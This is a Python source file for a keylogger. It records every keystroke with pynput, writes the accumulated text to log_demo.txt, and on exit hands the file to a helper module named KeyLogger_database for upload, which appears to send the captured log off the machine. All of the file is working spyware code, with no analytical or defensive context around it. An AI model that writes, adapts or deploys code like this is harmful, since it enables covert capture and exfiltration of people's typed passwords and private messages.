from pynput import keyboard
import KeyLogger_database as KeyLogger_database
import os


log = ""
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.esc:
            exit(0)
        else:
            log = log + " " + str(key) + " "
    with open("log_demo.txt", 'a') as logKey:
        logKey.write(f"\n{log}")

def upload_file():
    KeyLogger_database.Upload_file(file_name, file_path)


if __name__ == "__main__":
    keyboard_listener = keyboard.Listener(on_press=process_key_press)
    file_name = "log_demo.txt"
    file_path = os.getcwd() + f"\\{file_name}"
    with keyboard_listener:
        keyboard_listener.join()
    upload_file()
